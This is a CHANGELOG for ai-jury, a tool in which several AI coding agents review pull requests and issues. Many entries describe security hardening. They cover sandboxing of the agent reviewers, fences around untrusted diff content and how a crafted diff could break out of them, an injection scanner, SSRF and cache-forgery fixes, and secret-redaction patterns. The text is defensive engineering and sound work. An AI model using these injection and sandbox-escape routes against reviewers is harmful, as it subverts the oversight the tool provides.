- **The privilege audit now flags any unsandboxed non-claude reviewer** (#300). `audit_agent` previously warned only when a *dangerous flag* was present, so an unknown-vendor (or no-flag) agent that ran via the generic adapter produced **zero** warnings — and `--strict` couldn't fail it on that basis. It now warns whenever a non-claude agent isn't under a recognized read-only sandbox (`-s read-only` / `--sandbox`), closing the audit blind spot; a `local`/HTTP agent (no subprocess to sandbox) is correctly out of scope. (`--strict` already rejected an unknown vendor via config validation; this makes the default-mode gap visible too.)
- **Untrusted-content sentinel fences are neutralized before interpolation** (#301). The prompt templates wrap the diff/context/reviews in `<<<UNTRUSTED_X … UNTRUSTED_X>>>` fences; a diff that embedded a closing/opening sentinel verbatim could break out of (or forge) a fence. `prompts.neutralize_sentinels` now breaks any `<<<`/`>>>` run adjacent to an `UNTRUSTED_` marker in untrusted values (using a visible middle dot, not a zero-width char the injection scanner would flag) before every `format()`; the injection scanner still surfaces the attempt and the structured CI gate remains authoritative. `PROMPT_VERSION` bumped to 3 (cache invalidation).
- **Redaction now covers basic-auth URLs, Azure `AccountKey=`, and GCP service-account JSON keys** (#302). Added a `basic_auth` pattern that redacts the password in `scheme://user:password@host` (preserving the `://user:`…`@` structure so the URL stays readable; an empty username `https://:TOKEN@host` is covered too), added `account[_-]?key` to the assignment keywords (Azure `AccountKey=`/connection strings; `SharedAccessKey=` was already covered via `access_key`), and made the assignment separator tolerate a quoted key so a GCP `"private_key_id": "…"` JSON field is redacted while a non-secret like `"client_email"` is not.
- **Low-severity hardening bundle from the re-audit** (#303). The `detect_capabilities` version probe now runs through `_spawn`, so it too starts a new process group and kills the whole group on timeout (L-1, matching the main run path). The injection scanner's invisible-character set is extended to direction marks (LRM/RLM/ALM), invisible math operators, soft hyphen, CGJ, Mongolian vowel separator, and Hangul fillers, and its base64 heuristic now covers URL-safe `-_` (L-2). The cache `clear()` also rotates (deletes) the per-user `.hmac_key` (L-3); entries are written atomically via a temp file + `replace` (L-4); and a cache file is size-capped (8 MiB) before parsing so a giant attacker-planted entry can't be read into memory before its MAC is rejected (L-5).

## [1.3.0] - 2026-06-07

> Security-hardening release (audit + fixes for #287–#296). A few defaults are
> tightened and may require action: a **non-loopback local-model `endpoint`** is
> now rejected unless you set `JURY_ALLOW_REMOTE_ENDPOINT=1`, a **relative-path
> agent `command`** (e.g. `./bin/x`) is rejected (use a bare name or absolute
> path), and the **read-only sandbox is always enforced** for reviewers.

### Changed
- **README: the version badge now reads from PyPI** (#281). The `github/v/release` shields.io badge frequently rendered "Unable to select next GitHub token from pool" (a transient failure of shields.io's shared GitHub token pool); swapped for `pypi/v/ai-jury`, which uses a different, more reliable source and shows the actually-installable version.

### Added
- **Docs: a live dogfood case study** (`docs/case-study-dogfood-v1.2.0.md`, in the docs portal). Logs the jury (codex + agy + qwen, no Claude) reviewing the five PRs that became v1.2.0: 5 real bugs caught before merge (incl. a crash and a check-disabling bypass) **and** 3 false positives the chair wrongly "verified" — with the honest lesson that a non-executing verifier confirms plausible-but-wrong findings, so a panel is a high-recall finder that still needs executed verification.

### Security
- **A whole-codebase security audit** (`docs/security-audit-2026-06-07.md`) — static review across four attack surfaces (subprocess/sandbox, network/SSRF, prompt-injection/redaction, filesystem/parsing) with the High findings verified in source. Tracked as #288–#293.
- **The read-only sandbox is now enforced at the adapter layer, not left to config** (#288). The mandatory restriction flags lived entirely in each agent's `extra_args`, so an empty or misconfigured `jury.toml` (`extra_args = []`, a dropped `--disallowed-tools`/`-s read-only`/`--sandbox`) produced a write/tool-capable reviewer of an attacker-controlled diff, and the privilege audit only *warned*. `build_argv` now passes `extra_args` through `privilege.enforce_read_only`, which **guarantees** claude's write tools are in `--disallowed-tools` (merging into any existing value), and injects the secure-default sandbox for codex (`-s read-only`) / agy (`--sandbox`) when none is configured. Config may still knowingly *widen* a codex sandbox (an audited opt-in), but can no longer *remove* the restriction. Local (network) and unknown vendors are left untouched.
- **The privilege audit no longer trusts a bare `--sandbox` token blindly** (#292). `_is_sandboxed` is now vendor-aware: only the agy/gemini boolean `--sandbox` counts as a bare sandbox, while a codex sandbox must carry an explicit restricting value (`read-only`). A misleading `["--sandbox", "--dangerously-skip-permissions", "--yolo"]` on a non-agy vendor — previously judged "fully safe" — is now correctly surfaced.
- **Review prompts are delivered on stdin, never as process arguments** (#287). `claude -p <prompt>` and `agy --print <prompt>` placed the prompt — which embeds the redacted diff and PR/issue context — in argv, where any same-host process/user could read it via `ps`/`/proc/<pid>/cmdline`. Both now pipe the prompt on stdin (matching codex), so no real adapter exposes prompt content in the process list. Verified the CLIs read stdin in print mode (claude 2.1.x, agy 1.0.6).
- **Local-model endpoint is validated and reached over an http(s)-only, redirect-free opener** (#291). The `endpoint` from `jury.toml`/`--local-endpoint` flowed straight into `urllib`, whose default opener honors `file://`/`ftp://` — an SSRF/local-file-read primitive given this tool reviews attacker-controlled PRs/configs. `validate_config` now rejects any non-`http`/`https` scheme (hard error); a **non-loopback host is a hard error by default** and only allowed when the operator opts in via the `JURY_ALLOW_REMOTE_ENDPOINT` env var (kept out of the attacker-controlled config), then degrading to a warning (plus a cleartext warning for plaintext `http`). Every LocalAdapter request goes through an `OpenerDirector` that registers **no file/ftp handlers and no redirect handler**, so non-http(s) URLs raise `URLError` and a `3xx` to an internal/metadata host (e.g. `169.254.169.254`) is never followed — both surfaced after a cross-model jury review of the initial fix.
- **Low-severity hardening bundle** (#293): a **relative-path agent `command`** (`./tools/codex`) is now a config error — use a bare name (PATH) or absolute path, so a binary can't be run from an attacker-influenced relative location (F-6); agent subprocesses are spawned in their **own process group and the whole group is killed on timeout**, so a wrapper CLI can't leak orphaned grandchildren (F-7); the untrusted local-endpoint **error body is redacted** before it reaches the report (F-8); local-model **HTTP responses are capped** at 16 MiB so a malicious endpoint can't OOM the process (F-9); and cache entries now **embed and verify their key** and the cache dir is created **owner-only (0700)**, so another local user can't plant a forged verdict (F-10).
- **Redaction now covers `password=`, `aws_secret_access_key=`, and common provider tokens** (#289, #290). The `secret_assignment` pattern only recognized `api_key`/`secret`/`token` *anchored* at the start of the key, so `password = "…"` was missed entirely and `aws_secret_access_key=…` slipped through (the required `=` followed `_access_key`, not `secret`). The key side now allows surrounding identifier chars (so a keyword embedded mid-name still matches) and includes `password`/`passwd`/`access_key`/`private_key`/`client_secret`/`credential`. Added explicit patterns for Slack (`xox…`), Google (`AIza…`), Stripe (`sk_live_…`/`rk_live_…`), GitHub fine-grained PATs (`github_pat_…`), and JWTs. These ran verbatim into agent prompts and the rendered report before.
- **Cache entries are now MAC-protected and an untrusted cache dir is refused** (#295, follow-up to F-10). Each entry carries a **per-user HMAC-SHA256** keyed by a secret stored `0o600` at `<cache_dir>/.hmac_key`; an entry with a missing or wrong MAC (a forgery, or a legacy pre-MAC entry) is a miss. `store`/`load` also **fail closed** on a group/other-writable cache dir — `store` tightens a dir it owns to `0700` and refuses to write if it can't (no longer silently suppressing the `chmod` failure), and `load` never trusts a world-writable dir. POSIX only (Windows ACLs aren't represented in `st_mode`).
- **Opt-in strict absolute-path agent commands** (#296, follow-up to F-6). Setting `JURY_REQUIRE_ABSOLUTE_COMMAND=1` makes every agent `command` require an **absolute path** — rejecting even a bare name, whose `PATH` resolution an attacker controlling a CI runner's `PATH` could hijack with a shim. Off by default (bare names stay convenient for local use). `--doctor` now also prints the **resolved absolute path** each CLI command maps to, so an operator can verify which binary will run.

## [1.2.0] - 2026-06-05

### Fixed
- **`gh` calls are now time-bounded** (#246). `_gh` and `_gh_with_input` ran `subprocess.run` without a `timeout=`, so a stalled network call or an interactive auth/2FA prompt could hang the whole jury run indefinitely. Both now pass a 90 s ceiling and convert `TimeoutExpired` into a clear, fail-soft `RuntimeError` (`gh … timed out after 90s`), consistent with other gh failures.
- **`redaction_count` no longer inflated for a chunked review with expanded context** (#249). The same context is reviewed against every chunk, so redacting it inside each per-chunk `run_jury` counted its secrets once per chunk and `_merge_chunk_outcomes` summed them (a 1-secret context over 8 chunks reported 8). The context is now redacted **once** in `review_diff` before fan-out and its count added back a single time; per-chunk diff redactions are still counted per chunk (correct, each diff is distinct). Full (non-chunked) reviews are unaffected.
- **Anti-bias: the verification prompt no longer exposes reviewer identities** (#250). `_format_findings_for_verify` emitted `(by {reviewer})`, so the chair could see which agent raised each candidate finding while judging it — a self-preference gap the debate (#37) and synthesis (#38) anonymization already closed, but the verify phase never did. Reviewer attribution is dropped from the verify input (verdicts match back by `file`/`line`/`claim`); the rendered report still attributes every finding by real agent name.

### Added
- **PR descriptions are now enforced, not just templated** (#271). A GitHub PR template only pre-fills the body — it can't stop a PR being opened/merged empty (as #270 was). Added a `Related issues` (`Closes #N`) section to `.github/pull_request_template.md` and a `pr-lint` workflow (`.github/workflows/pr-lint.yml`) that fails a PR whose description has no real summary (< 20 chars of prose, excluding headings/checklists) or no issue reference (`#N`, or an explicit `no issue` opt-out). Pure stdlib Python, reads the body from the event payload via an env var (no shell injection). To make it blocking, add **PR description lint / PR has a real description + linked issue** to the branch-protection required checks (one-time repo setting).
- **Friendly first-impression CLI surface** (#265). Running bare `jury` with no arguments **in a terminal** now prints a compact overview — one line on what it does plus the handful of commands most people use — and exits 0, instead of the argparse error. Non-interactive use (piped/CI) keeps the strict `provide one of --pr/--issue/--diff-file` error + non-zero exit. Adds two argv-intercept subcommands: `jury examples` (common example commands) and `jury guide` (a short end-to-end walkthrough).
- **TL;DR verdict callout at the top of every report.** The report now opens with a one-line `> ⚡ **TL;DR · <verdict>**` callout so the outcome is the first thing a reader sees — above the panel and the full breakdown. The headline is the panel vote's verdict when voting, otherwise the chair's `## Verdict` line lifted verbatim from the synthesis (works for both PR review — APPROVE/COMMENT/REQUEST CHANGES — and issue triage — READY/NEEDS-INFO/UNCLEAR). Purely additive and deterministic: omitted when no verdict is available (failed/absent synthesis), never replacing a section. Report goldens regenerated.

## [1.1.1] - 2026-06-05

### Fixed
- **Credibility-cluster bugs the jury found reviewing its own repo**:
  - #245 — `--fail-on blocker` now fires: `blocker` is normalized to its documented `critical` alias instead of a gate that silently never triggers.
  - #247 — a verifier-**rejected** (`unsupported`) major finding no longer drives a `high` risk level.
  - #248 — the **JSON** report's metadata now reflects an effective `--decision vote` (the JSON path threads `decision`/`vote`, not just markdown).
  - #251 — a reviewer that **abstained** (empty reply or a short refusal) is dropped from a panel vote instead of counting as a 'clear' (APPROVE/READY) vote.
  - #252 — docs (`architecture.md`, `CLAUDE.md`) now match the actual Pages deploy trigger (push to `main`).
  - #253 — corrected the stale `CodexAdapter` comment (shipped default is `-s read-only`).
  - #254 — the release **SBOM** is built from an isolated wheel-only venv (the package + its declared, empty runtime deps), not `cyclonedx-py environment` over the whole runner (`pyproject` is not a valid `cyclonedx-py` subcommand, which would have failed the publish).

### Changed
- **Benchmark: measured the panel's lift over each model, published honestly.** Added `benchmark/sweep.py` — runs each reviewer **solo** vs the **panel** vs the **full jury** over the labeled fixtures (`benchmark/`) — and `docs/benchmark-results.md`. Live v1.1.0 (2026-06-05, 4 vendors: claude/codex/agy + local `qwen2.5-coder:7b`; each cloud reviewer used its CLI's default model at run time, not pinned): run alone, **every** model missed seeded bugs (best 67%, worst 33%, all at 100% precision); the **panel caught 100%** — so **vendor diversity robustly lifts recall**, whichever single you'd have picked. The precision/verification effect is **within noise at N=5** (jury precision varied 1.00↔0.60 between runs) and is **not** claimed. Surfaced on the homepage "Why a panel" section + the README benchmark section; Magpie stays credited in the prior-art/comparison docs (not re-stated on the results page). No sitemap/robots change — docs pages are `docs.html` fragments, not separate URLs.
- **Docs: dropped the stale "MVP" framing.** `feasibility.md` (research grounding) still called the now-shipped v1.1.0 project an "MVP" in the present tense ("this MVP", "MVP run observations", "running the MVP"). Reworded to "first version / v1 / ai-jury" and retitled the run notes "Live-run observations"; the historical research context is unchanged.
- **Docs: broadened the ecosystem comparison & prior art.** Added two categories to `comparison.md` — *host-assistant plugins* (e.g. open-code-review: multi-persona debate inside one host/vendor) and *per-rule CI checks* (e.g. Continue: no cross-agent debate) — and noted Calimero (Anthropic-only consensus) under API-level. README prior-art now cites VulTrial (ICSE 2026), the academic prosecutor/defense/judge/jury approach. Framing verified against each project's own docs.
- **Website: refreshed hero + OG banner art.** Updated `website/assets/` (`hero.svg`/`hero-light.svg`, `hero.png` 2400×1260, `og-banner.png` 1200×630) to the new design and bumped `sitemap.xml` lastmod to 2026-06-05.
- **Taglines now reflect the full scope.** The one-line descriptions in the README, the skill (`SKILL.md`), the plugin manifest, and `positioning.md` said only "review a PR/diff → a chair synthesizes one verdict"; they now read "review a diff, PR, or issue → cross-examine → verify → one verdict, a chair's synthesis **or a panel vote**", matching the shipped feature set.
- **Docs/site: published the full live-run report.** The verbatim Markdown report from the v1.1.0 four-vendor run is now a docs page (`docs/live-review-report.md`, dated *v1.1.0 · 2026-06-04*), registered in the portal and linked from the live-review page and the homepage "Real run" card — every finding/verification/verdict exactly as the tool wrote it. Future re-runs (after fixes) can be added as their own dated reports.
- **README refresh** (closes #255). The **Status** "Shipped" list now includes issue review, chair-or-panel-vote, live play-by-play, full-transcript/verbose, and the `jury init --wizard`; the **CLI compatibility contract** "Stable flags" list was expanded to the full current parser surface (grouped by intent); and the error-message table no longer implies `--post-summary` is PR-only (it posts to `--issue` too).
- **Docs/site: abdication case study.** Expanded the "a reviewer refused, the jury excluded it" moment from the live run into a dedicated `docs/case-study-abdication.md` (registered in the docs portal), linked from `example-live-review.md`, and surfaced as an expandable `<details>` under the homepage "Real run" card. Explains why "no findings" must not be read as APPROVE, and notes the chair-vs-vote nuance (tracked as #251).
- **Website + docs: refreshed the "Real run" with a current v1.1.0 review.** Re-ran the four-vendor panel (Claude, Codex, Antigravity + a free local Qwen) over the whole repo on v1.1.0 (2026-06-04): 8 chunks, 25 verified findings, 6 of the panel's own false positives rejected, 22 secrets redacted. Updated the homepage "Real run" card (date + version + fresh stats/quote) and rewrote `docs/example-live-review.md` with the new findings — including the jury excluding a reviewer that refused to answer rather than scoring the non-answer as a pass.
- **Website hero: distinct issue-verdict colours.** Issue verdicts now read green / amber / indigo (READY / NEEDS-INFO / UNCLEAR) instead of reusing the PR red for NEEDS-INFO — the verdict badge and the animated verdict-stage glow both follow the new palette. Visual-only.
- **Website hero pipeline: PR / Issue mode tabs.** The animated hero pipeline now
  has a `Pull request` / `Issue` tablist — switching modes restarts the loop with
  mode-appropriate scenarios and verdicts (PR: `--pr 123/124/125` →
  APPROVE / REQUEST CHANGES / APPROVE · issue: `--issue 42/43/44` →
  READY / NEEDS-INFO / UNCLEAR), and the input label (`diff / PR` ↔ `issue`) and
  synthesis stage (`chair` ↔ `vote ✓`) follow the active scenario. Adds the
  `.pipe-tabs`/`.pipe-tab` styles and the issue verdict colours
  (`ready`/`needsinfo`/`unclear`) to `styles.css`.
- **Website interactive demo: panel vote now works for issues.** The "Build your
  jury" demo (`website/app.js`) used to force the chair and disable the vote
  option whenever the target was an issue ("n/a for issues") — stale since #230
  shipped issue voting, and contradicting the site's own FAQ. The demo now offers
  panel vote for issues with the mode-aware tally (`NEEDS-INFO > UNCLEAR > READY`,
  majority wins, ties to the stricter stance), emits `--decision vote` in the
  generated command, and shows the per-reviewer ballots + vote footer — matching
  the real CLI. PR-only output toggles (phased / live progress) stay issue-disabled.
- **Docs accuracy sweep across every doc.** Full pass over `docs/`, `README.md`,
  and the checklists fixing stale/incorrect content: README status bumped to
  v1.1.0 and the "no input" error example now lists `--issue`; `feasibility.md`
  no longer calls early-stop / verify / anonymized feedback "roadmap" (all
  shipped); `releasing.md` corrected — trusted publishing is configured and the
  publish step is **not** `continue-on-error`; `release-checklist.md` marks the
  shipped website / hero visual / plugin-matrix items done; `architecture.md`
  clarifies Codex is fed on stdin and that the verdict vocabulary is mode-aware
  (issue verdicts + panel vote); `comparison.md` gains panel-voting and
  issue-review rows; fixed broken in-doc anchors (`#presets`, `#comment-actions`,
  and a benchmark cross-link). No behaviour change.
- **Docs & website: complete the issue / voting / wizard coverage** (#236).
  Corrected PR-only phrasing now that `--post`/`--post-summary` post to issues
  too (via `gh issue comment`): the parameter-reference "GitHub posting" section,
  the cookbook, and the skill doc no longer imply posting requires `--pr`. Added
  the guided wizard (`jury init --wizard`) to the Common recipes and cookbook
  setup; documented `decision = chair|vote` and the mode-aware verdict
  vocabulary (PR `REQUEST CHANGES > COMMENT > APPROVE`; issue `NEEDS-INFO >
  UNCLEAR > READY`) in the Enumerations and configuration behaviour sections. The
  website gains an issue step in the Quickstart, more `--issue` examples under
  "More commands", a `decision` key in the Configuration list, and an
  issue-review FAQ entry (visible + structured-data).

## [1.1.0] - 2026-06-04

### Added
- **Guided init wizard** (#231): `jury init --wizard` runs an opt-in,
  numbered-option setup for the most-used settings (reviewers, depth,
  chair-vs-vote decision, verification, context policy + secret redaction, CI
  gate). Every question is skippable — pressing Enter keeps the built-in
  default — and the wizard writes only the keys you explicitly chose, so the
  generated `jury.toml` stays minimal. Plain `jury init` is unchanged.
- **Live per-step posting for issues** (#229): `jury --issue N --live --post` now
  posts each step to the issue thread as it happens (via `gh issue comment`),
  symmetric with the PR flow. Opt-in (requires `--post`); `--issue --live` alone
  still just streams to the terminal, and `--issue --post` alone still posts one
  summary comment.
- **Panel voting for issues** (#230): `--decision vote` now works with `--issue`
  too. The vote is mode-aware — a diff/PR tallies REQUEST CHANGES > COMMENT >
  APPROVE, an issue tallies **NEEDS-INFO > UNCLEAR > READY** (each reviewer votes
  from the worst gap they raised; majority wins, ties resolve to the stricter
  stance, the chair stays the default). Replaces the previous chair-only fallback.
- **Issue review** (#221): `jury --issue N` reviews a GitHub **issue** for
  completeness and clarity (reproduction steps, expected vs actual, scope /
  acceptance criteria, missing context, actionability) using the same
  multi-agent jury machinery (panel → debate → verify → synthesis) with an
  issue-quality rubric. The verdict vocabulary is **READY / NEEDS-INFO /
  UNCLEAR**. `--post`/`--post-summary` comments back via `gh issue comment`;
  PR/diff-only flags (`--post-inline`, `--post-progress`, `--label`,
  `--incremental`) are rejected for `--issue`.
- **Panel voting verdict** (#220): `--decision vote` (or `[jury] decision = "vote"`)
  derives the final verdict by **tallying the reviewers** instead of letting a single
  chair decide — each reviewer votes from the worst finding they raised
  (critical/major → REQUEST CHANGES, minor/nit → COMMENT, none → APPROVE), majority
  wins, ties resolve to the stricter stance. The report shows the tally + per-reviewer
  ballots as the headline verdict and keeps the chair's synthesis as supporting
  reasoning; the tally is also written to `--metadata-json`. Pure/deterministic and
  rendering-only — it doesn't change orchestration, the cache key, or the
  severity-based `--ci` gate (which stays the independent hard safety check).
- **Live play-by-play** (#210): `--live` streams the deliberation as it happens —
  each reviewer's output, each debate turn, the verification, and the chair's
  decision are emitted the moment they land, instead of only at the end. With
  `--pr` each step is also posted as its own PR comment ("post after post", as if
  watching the jury live). The orchestrator stays pure: it fires an optional
  `on_event(kind, result, round_no)` callback in deterministic per-phase order;
  the CLI does the I/O. PR posting is best-effort and never aborts the run.
- **Full-transcript / verbose output** (#208): `--transcript` renders the whole
  play-by-play — each agent's raw review, the debate exchanges, and the chair's
  decision *and its reasoning* — instead of the consensus-first summary;
  `--verbose` shows the summary followed by the transcript in one document; and
  `[jury] transcript = true` makes the transcript the default (`--no-transcript`
  overrides). It works with `-o FILE` (a shareable Markdown artifact) and posts to
  a PR via the existing `--post` flow. Rendering-only: the orchestration, outcome,
  and cache key are unchanged.

### Changed
- **Example-rich parameter reference, surfaced on the site** (#209): `docs/parameters.md`
  now opens with a **Common recipes** block (copy-pasteable commands for the everyday
  jobs) and carries a worked **Example** for every flag group, with enum values and
  depends-on/conflicts notes spelled out. The docs portal (`website/docs.html`) now
  lists it first under a **Reference** group ("Parameter reference — start here") and
  leads with the practical Reference/Guides over the Overview material, so the flag
  reference is the obvious entry point instead of being invisible.
- The **skill** (`skill/ai-jury/SKILL.md`) now includes a curated **Parameters**
  section (#213) — the common flags grouped by intent (what to review, depth,
  output incl. `--transcript`/`--verbose`/`--live`, PR posting, CI gating, scope)
  with a pointer to the full `docs/parameters.md` reference — so the option surface
  is discoverable when ai-jury is invoked as a Claude Code skill.
- Removed internal `(issue #N)` references from user-facing surfaces (#212): the
  `jury --help` text and the docs pages no longer cite this repo's issue tracker,
  which means nothing to a reader. The `CHANGELOG` and source-code comments keep
  their references for history/developer context.
- **Rebuilt the project website from a fresh design direction** (closes #159).
  New landing page plus dedicated `docs.html`, `coverage.html`,
  `coverage-report.html`, and `404.html`; refreshed favicon set, OG banner, and
  convergence logo mark. `make assets` now also regenerates the favicon set
  from `website/favicon.svg`.
- Wired **Google Analytics 4 (gtag.js)** into the website via
  `website/analytics.js` (loaded from every page's `<head>`). The active GA4
  property is set by `MEASUREMENT_ID` in that file. Scope is website-only —
  the `ai-jury` CLI itself remains telemetry-free.

## [1.0.0] - 2026-06-03

First public release. `ai-jury` orchestrates native coding-agent CLIs (Claude
Code, Codex, Antigravity) plus an optional local/open-weight model to review,
debate, verify, and synthesize one verdict on a diff or PR — stdlib-only, secure
by default, project-agnostic.

### Changed
- **CI runs entirely on GitHub-hosted runners now that the repo is public.** The
  hosted `ci.yml` matrix (ubuntu/macOS/windows × Python 3.11–3.13) plus a
  coverage gate is the authoritative per-push/PR signal, and CodeQL + OpenSSF
  Scorecard run per-commit again. The self-hosted macOS runner and its
  `local-ci.yml` workflow were **removed**: running untrusted forked-PR code on a
  maintainer machine is an arbitrary-code-execution risk, and free public-repo
  minutes make it unnecessary. The website (GitHub Pages) and PyPI publishing
  (OIDC trusted publishing on `v*` tags) are now live.


- The `ai-jury` skill is now a compound, end-to-end flow: scaffold a config
  if needed (`jury init`) → review → capture the report (`-o`) → summarize,
  noting that `jury` already combines review + report in one command. Covers the
  local/open-weight option and add-ons (`--incremental`, `--suggest-patches`,
  `config show`, `--doctor`).
- README and hero visual updated to cover current capabilities (#112): the hero now
  shows the **fourth, local / open-weight** panelist (alongside Claude/Codex/Antigravity)
  and the broader pipeline; the README leads with free/offline reviews, `jury init`,
  and secure-by-default sandboxing, and the Status section reflects shipped features.
- Run metadata schema bumped to v2: adds `stop_reason`, `skipped`, `retried`,
  `budget_exhausted`, `from_cache`, an `execution` block, and per-agent
  `attempts`.

- Public CLI compatibility contract: `tests/test_cli_contract.py` locks the
  CLI's flags, `--help` text (width/color-pinned golden under `tests/golden/`),
  error messages, exit codes, and report headings, with a documented stability
  policy in the README. **Breaking changes to these surfaces require a
  CHANGELOG entry.**

- Multi-version, multi-OS CI test matrix (Python 3.11–3.13 on Linux; 3.13 on
  macOS and Windows) covering unit tests and the mock CLI smoke test.
- OpenSSF Scorecard, CodeQL (Python), and Dependabot automation for supply-chain
  and repository-security signals, plus a documented dependency-update policy.
- Ecosystem comparison & capability matrix (`docs/comparison.md`) positioning the
  project against hosted, API-level, and other native-CLI review tools.
- Agent-readable docs: `llms.txt` (concise) and `llms-full.txt` (full reference).
- Public release readiness checklist (`docs/release-checklist.md`).
- Claude Code plugin distribution: `.claude-plugin/plugin.json` and
  `.claude-plugin/marketplace.json` make the repo installable as a single-plugin
  marketplace, reusing the existing `skill/` without moving it.
- Platform support matrix (`docs/platforms.md`) with honest per-platform statuses
  (supported / manual / planned / out of scope) and install snippets.
- Reusable-skill packaging guide (`docs/skill.md`): directory layout, install into
  Codex/Claude-compatible skill folders, required external tools, skill-to-CLI
  versioning policy, examples, and a smoke-test checklist. Skill behavior changes are
  noted in these release notes alongside the CLI change that motivates them.
- Polished README hero visual (`docs/assets/hero.svg` + rendered `hero.png`) with
  meaningful alt text and the project tagline.
- Static landing site under `website/` (HTML/CSS, no build step) reusing the hero asset,
  plus a GitHub Pages deploy workflow and local-preview/custom-domain instructions.

### Fixed
- Printing the report no longer crashes with `UnicodeEncodeError` on a Windows
  console (legacy cp1252 code page): the CLI now reconfigures stdout/stderr to
  UTF-8 at startup so the report's `🏛️`/`⇄` characters encode cleanly. Surfaced
  by the now-active hosted Windows CI job.


- The result cache key now includes the repository review policy (#122); a
  `--policy` change no longer collides on the same key and serves a stale outcome.
- `config_hash` now covers `anonymize_debate` and `prefer_non_reviewer_chair`
  (#122), so the "same hash ⇒ same orchestration" guarantee (and the cache key)
  holds.
- Inline review posting sends a top-level `body` (#122); GitHub's create-review
  API requires it for a COMMENT event, so `--post-inline` no longer risks a 422.
- docs/security.md least-privilege table corrected to the secure-by-default
  sandboxing (codex `-s read-only`, agy `--sandbox`) — it still described the old
  `danger-full-access` default (#122).
- Secret redaction now scrubs modern OpenAI keys `sk-proj-…` / `sk-svcacct-…` /
  `sk-admin-…` (#122); the old pattern stopped at the first hyphen and would have
  sent them to review agents (no real key actually leaked).
- Removed an accidentally-committed machine-local `cache/projects.json` (local
  paths, no secret) and gitignored `cache/` (#122).
- Secret redaction now preserves the surrounding quotes of a redacted
  assignment (#102), so scrubbing a secret-fixture file keeps it a valid string
  literal instead of fabricating phantom "syntax error" findings for reviewers.
- A reviewer CLI that exits **nonzero** is now always treated as a failure, even
  when it printed to stdout (#101); partial/error output no longer silently
  counts as a clean review feeding consensus, synthesis, and the CI gate.
- Result cache key now includes the `--mock` flag, so a mock run can never be
  served as a real review (or vice versa) for the same diff+config.
- `total_timeout` now bounds a whole **chunked** review instead of resetting per
  chunk: `review_diff` threads one shared budget through every chunk's
  `run_jury` (which gained an optional `budget` parameter).
- The structured-findings report no longer crashes (`TypeError`) when two
  same-severity findings include one with no `file`/`line`; the sort key is
  None-safe.
- Self-hosted CI (`local-ci.yml`) no longer runs untrusted **forked-PR** code on
  the self-hosted runner — both jobs are guarded to same-repo pushes/PRs,
  closing an arbitrary-code-execution exposure on the runner host.
- Large-diff binary detection (#31) no longer misclassifies a *source* file as
  binary just because its content mentions `Binary files` / `GIT binary patch`;
  it now matches only the diff's unprefixed binary-marker header line.
- `jury --doctor` reports local/open-weight agents (#43) by their endpoint
  reachability instead of a (non-existent) CLI on PATH, so a reachable local
  server no longer shows as `MISSING`.

### Security
- Secure-by-default agent sandboxing (#100): the shipped reviewer defaults no
  longer grant broad powers while reading untrusted PR content. `codex` now runs
  `-s read-only` (was `danger-full-access`) — the diff is fetched by the jury,
  not the agent, so the reviewer needs no write/network; `agy` now runs
  `--sandbox`; `claude` keeps its write-tool denylist. The least-privilege audit
  recognizes a sandbox as a mitigation, and the shipped defaults raise no
  warnings. Widen a sandbox only if your workflow needs it.

### Added
- Published **test-coverage report + badge** on the project site (no external
  service): the Pages deploy runs the suite under coverage, publishes a
  browsable HTML report at `/coverage/`, and writes a shields-endpoint badge
  (`coverage-badge.json`) shown in the README and site badge row. Statement+branch
  coverage is **95%**, with every module ≥90%.
- The consensus section now shows each finding's supporting **evidence** (the
  reviewer's "why"), so a verdict is auditable rather than just asserted.
- `--post-mode {single,phased}` (#127): with `--post-summary`, post the review as
  one comment (default) or as separate **Round 1 / Debate / Decision** comments,
  so the flow (each reviewer's findings → cross-examination → verdict & why) is
  easy to follow. Pairs with `--post-progress` for live stage tracking.
- `--post-progress` (#125): keeps a single, sticky status comment on the PR,
  updated live at each round/chunk milestone (round 1 → debate → verify →
  synthesis; chunk i/N), then replaced with the final verdict. Off by default;
  requires `--pr`; best-effort (a GitHub hiccup never crashes the run).
- Risk-aware auto-depth (#120): `--auto` / `[jury] auto_depth` scales review
  intensity to a cheap pre-review diff profile (size / files / docs-or-generated
  / security-sensitive paths) — a trivial or docs-only diff runs shallow
  (`rounds=1`, no verify) while a large or security-touching diff runs full.
  The panel (vendor diversity) is never trimmed; explicit `--rounds`/`--verify`/
  `--early-stop` override it; the chosen depth is logged.
- `jury init --preset offline|fast|balanced|thorough` — one-command setup for
  common intents (offline = free local-only; fast = 1 round; balanced = debate +
  early-stop; thorough = all agents + debate + verify). Explicit flags override
  the preset's defaults.
- Smart offline fallback: with no config file, no available agent CLI, and a
  reachable local model server, `jury` automatically adds a local agent so it
  works offline out of the box (never overrides an explicit config or a working
  CLI panel).
- `jury config show` / `jury config path` print the **effective resolved
  config** (and its source file) so you can see exactly what a run will use.
- `jury --doctor` now ends with a **Next steps** section: a `ready to run:
  yes/no` verdict plus actionable fixes (scaffold a config, install a CLI, or use
  a reachable local model).
- `jury init` scaffolds a `jury.toml` (#107): detects which agent CLIs are
  available and writes a valid config from interactive prompts or flags
  (`--agents claude,codex,qwen --rounds 2`), using the secure-by-default agent
  templates. `--list-agents` shows availability; existing files are not
  overwritten without `--force`.
- `jury init` discovers **local (Ollama/OpenAI-compatible) models** (#109):
  the interactive flow lists the models on your server and lets you pick one
  (preferring a coder model); `jury init --list-models` prints them. Falls
  back gracefully to a typed default when no server is reachable.
- Local / open-weight reviewer (#43): a new `vendor = "local"` agent talks to any
  OpenAI-compatible server (Ollama, llama.cpp, vLLM, LM Studio) over plain HTTP
  via the stdlib — no new dependencies, no subprocess. Configure with an
  `endpoint` (default `http://localhost:11434/v1`) and a `model`; it participates
  in every round and the consensus like a CLI agent, adding vendor diversity at
  zero marginal cost and enabling fully offline reviews. An unreachable server
  fails with the typed `connection_error` code. README + benchmark note document
  one concrete setup (Ollama) and the cost/quality trade-off.

- Release provenance, checksums, and SBOM (#25): the publish workflow now emits a
  `SHA256SUMS` checksum file, a CycloneDX SBOM (`sbom.cdx.json`), and a signed
  build-provenance attestation, and publishes to PyPI via trusted publishing
  (OIDC, no long-lived token). New `docs/releasing.md` documents how artifacts
  are built and verified (`sha256sum -c`, `gh attestation verify`); the release
  checklist references it.

- Incremental review mode (#9): `--incremental` reviews only the diff since the
  last jury run on a PR (the reviewed head SHA is recorded as a hidden marker
  on the summary comment), falling back to a full review when no prior marker
  exists or the head is unchanged. The report states the review scope.
- Suggested patches (#10): `--suggest-patches` emits a separate, opt-in
  suggested-patches section for **verified** findings only — read-only, never
  applied automatically. `--patches-out PATH` writes them to a file instead.
